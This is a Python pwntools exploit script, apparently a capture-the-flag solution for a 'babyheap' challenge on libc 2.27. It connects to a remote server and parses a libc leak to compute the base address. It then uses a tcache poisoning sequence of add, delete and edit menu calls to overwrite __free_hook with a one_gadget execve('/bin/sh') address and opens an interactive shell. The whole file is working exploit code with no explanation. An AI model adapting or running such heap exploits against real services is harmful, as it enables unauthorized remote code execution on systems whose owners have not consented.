from pwn import *
from pwn_debug.pwn_debug import *
context.log_level = 'debug'

TARGET = "babyheap"
LIBC = "./libc-2.27.so"
elf = ELF(TARGET)
libc = ELF(LIBC) 

HOST = '133.242.68.223'
PORT = 58396

pdbg = pwn_debug(TARGET)
pdbg.local(LIBC) 
# r = pdbg.run("local")
r = remote(HOST, PORT)

# bp, fork-mode, command
# pdbg.bp([], 'child', ['x/20gx $rax', 'vmmap'])
# pdbg.bp([0xa34])

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r.recvuntil('>>>>> ')
leak = int(r.recvuntil(' <<<')[:-4], 16)
dbg("leak")
base = leak - 0x3eba00
dbg("base")



rdi = base + 0x1102e5
system = base + 0x4f440
binsh = base + 0x1b3e9a
malloc_hook = base + 0x3ebc30
free_hook = base + 0x3ed8e8
gadget = [
0x4f2c5, # execve("/bin/sh", rsp+0x40, environ)
0x4f322, # execve("/bin/sh", rsp+0x40, environ)
0x10a38c # execve("/bin/sh", rsp+0x70, environ)
]
r.sendlineafter('> ', '1')
r.sendlineafter('Content:', p64(free_hook))

r.sendlineafter('> ', '2')
r.sendlineafter('> ', '2')
r.sendlineafter('> ', '3')




r.sendlineafter('> ', '1')
r.sendlineafter('Content:', p64(free_hook))
r.sendlineafter('> ', '3')

r.sendlineafter('> ', '1')
r.sendlineafter('Content:', "AAAA")
r.sendlineafter('> ', '3')

r.sendlineafter('> ', '1')
r.sendlineafter('Content:', p64(base+gadget[1]))
r.sendlineafter('> ', '3')

r.sendlineafter('> ', '2')


r.interactive()
